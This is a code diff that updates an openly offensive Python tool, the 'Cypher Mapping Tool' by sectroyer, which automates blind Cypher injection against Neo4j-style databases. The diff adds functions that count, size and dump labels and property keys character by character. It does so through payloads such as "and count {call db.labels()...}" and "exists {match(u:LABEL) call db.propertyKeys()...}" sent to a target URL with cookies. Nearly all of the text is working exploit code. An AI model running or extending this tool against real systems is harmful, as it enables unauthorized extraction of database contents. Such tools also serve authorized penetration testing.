@@ -76,31 +76,39 @@ def generate_cookies_dictionary(cookie_string):
                 cookie_dict[name_value[0]] = name_value[1]
     return cookie_dict
 
-def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    for number_of_labels in range(0,100,1): # arbitarily set max number or labels to 100 :)
-        payload = injection_type + " and count {call db.labels() yield label return label} = " + str(number_of_labels)
-        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+def get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
+    for number_of_results in range(1000): # arbitarily set max number or results to 1000 :)
+        current_payload=payload.replace("%NUMBER_OF_RESULTS%",str(number_of_results))
+        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
         if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
-            return number_of_labels
-    print("Unable to check number of labels!!!")
+            return number_of_results
+    print("Unable to check number of results!!!")
     sys.exit(-1)
 
-def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
-    for size_of_label in range(0,1000,1): # arbitarily set max size of label to 1000 :)
-        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
-        payload+=" limit 1 where size(label) = "+str(size_of_label)+" return label}"
-        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
-        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
+
+def get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout):
+    for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
+        current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
+        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
         if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
-            return size_of_label
-    print(f"Unable to check size of label with index {label_index}!!!")
+            return size_of_result
+    print("Unable to check size of result!!!")
     sys.exit(-1)
+    
+def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
+    payload+=" limit 1 where size(label) = %SIZE_OF_RESULT% return label}"
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout) 
 
 def dump_string_value(target_url, dump_prefix, dump_size, payload, post_data, cookies_dict, connection_timeout):
     print("\r"+(80*" ")+"\r"+dump_prefix,end='')
     dump_value=""
-    for character_number in range(0,dump_size,1):
+    for character_number in range(dump_size):
         for current_char in ascii_chars:
             if current_char == "'":
                 current_char="\'"
@@ -116,8 +124,8 @@ def dump_string_value(target_url, dump_prefix, dump_size, payload, post_data, co
 def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
     global ascii_chars
     label_array=[]
-    for label_index in range(0,number_of_labels,1):
-        label_size=get_size_of_label(target_url,label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    for label_index in range(number_of_labels):
+        label_size=get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
         print(f"Size of label number {label_index}: {label_size}")
         label_dump_prefix=f"Value of label number {label_index}: " 
         print("\r"+(80*" ")+"\r"+label_dump_prefix,end='')
@@ -127,9 +135,47 @@ def dump_labels(target_url, number_of_labels, injection_type, blind_string, post
         label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, post_data, cookies_dict, connection_timeout)
         label_array.append(label_value)
         print("\n")
-    print("")
+    print("Labels:")
     dump_ascii_table(label_array)
     return label_array
+
+def get_number_of_properties(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and count {call db.propertyKeys() yield propertyKey return propertyKey} = %NUMBER_OF_RESULTS%" 
+    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)
+
+def get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
+    payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey]) and size(propertyKey) = %SIZE_OF_RESULT%" 
+    payload+=" return propertyKey} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+    return get_size_of_result(target_url, payload, post_data, cookies_dict, connection_timeout) 
+
+def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
+    number_of_properties=get_number_of_properties(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+    print(f"Total number of properties: {number_of_properties}\n")
+    print(f"Checking which properties are connected to label '{label_to_dump}'...\n")
+    label_properties_array=[]
+    for property_index in range(number_of_properties):
+        payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
+        payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey]) return propertyKey}" 
+        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+        injection_result=cypher_inject(target_url, payload, post_data, cookies_dict, connection_timeout)
+        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
+            print(f"Property with index {property_index} is valid for label '{label_to_dump}'.")
+            property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
+            print(f"Size of property number {property_index}: {property_size}")
+            property_dump_prefix=f"Value of property number {property_index}: " 
+            payload = injection_type + " and exists {match(u:"+label_to_dump+") call db.propertyKeys() yield propertyKey"
+            payload+=" with propertyKey skip "+str(property_index)+" limit 1 where not isEmpty(u[propertyKey])"
+            payload+=" and substring(propertyKey,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return propertyKey}" 
+            payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
+            property_value=dump_string_value(target_url, property_dump_prefix, property_size, payload, post_data, cookies_dict, connection_timeout)
+            label_properties_array.append(property_value)
+            print("\n")
+    print(f"Label: {label_to_dump}\n")
+    print("Properties:")
+    dump_ascii_table(label_properties_array)
+    return label_properties_array
 
 def dump_ascii_table(data):
     # determine the number of columns
@@ -155,7 +201,7 @@ def dump_ascii_table(data):
     print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
 
 
-print('\nCypher Mapping Tool by sectroyer v0.1\n')
+print('\nCypher Mapping Tool by sectroyer v0.2\n')
 
 try:
     parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
@@ -195,6 +241,7 @@ try:
         dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
     elif args.labels:
         print(f"Dumping properties for labels: {args.labels}...\n")
+        dump_properties(target_url, args.labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
 
     print('')
 except SystemExit:
